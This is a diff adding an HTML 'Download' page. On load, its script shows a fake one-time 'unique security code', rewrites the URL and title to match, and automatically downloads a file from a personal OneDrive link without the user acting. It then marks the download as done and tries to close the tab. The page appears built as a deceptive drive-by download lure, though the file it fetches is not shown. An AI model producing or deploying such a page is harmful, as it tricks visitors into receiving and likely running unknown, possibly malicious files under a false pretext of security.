@@ -1,0 +1,83 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Download</title>
+  <style>
+    body {
+      margin:0;
+      height:100vh;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      background:#fff;
+      color:#111;
+      font-family:monospace;
+      font-size:20px;
+      text-align:center;
+      padding:20px;
+    }
+    .error {
+      color:red;
+      font-weight:bold;
+    }
+  </style>
+</head>
+<body>
+  <div id="tokenDisplay">Creating unique security code...</div>
+
+  <script>
+    const names = [
+      "Your temporary unique security code (one download only): $number$"
+    ];
+
+    const tokenDisplay = document.getElementById('tokenDisplay');
+
+    function randomName() {
+      let name = names[Math.floor(Math.random() * names.length)];
+      if (name.includes("$number$")) {
+        const randomNum = Math.floor(Math.random() * 1000000000000000000000);
+        name = name.replace("$number$", randomNum);
+      }
+      return name;
+    }
+
+    function downloadFile(url) {
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = '';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+    }
+
+    function showToken() {
+      // Si ya descargó, intentamos cerrar la pestaña
+      if (sessionStorage.getItem('download')) {
+        // Intentar cerrar
+        window.close();
+        // Si no se puede cerrar, mostramos mensaje
+        tokenDisplay.innerHTML = "<span class='error'>You have already downloaded this file. Please close this tab.</span>";
+        document.title = "Download already used";
+        return;
+      }
+
+      const token = randomName();
+      tokenDisplay.textContent = token;
+      document.title = token;
+      try {
+        history.pushState({}, '', '/' + token);
+      } catch(e) { console.warn(e); }
+
+      // Descarga automática
+      downloadFile("https://onedrive.live.com/personal/ea068b537b44d669/_layouts/15/download.aspx?UniqueId=314ab56a%2D9206%2D40b5%2Dacc5%2Ddb02fdaceea4");
+
+      // Marcamos que ya se descargó
+      sessionStorage.setItem('download', 'true');
+    }
+
+    window.addEventListener('load', showToken);
+  </script>
+</body>
+</html>
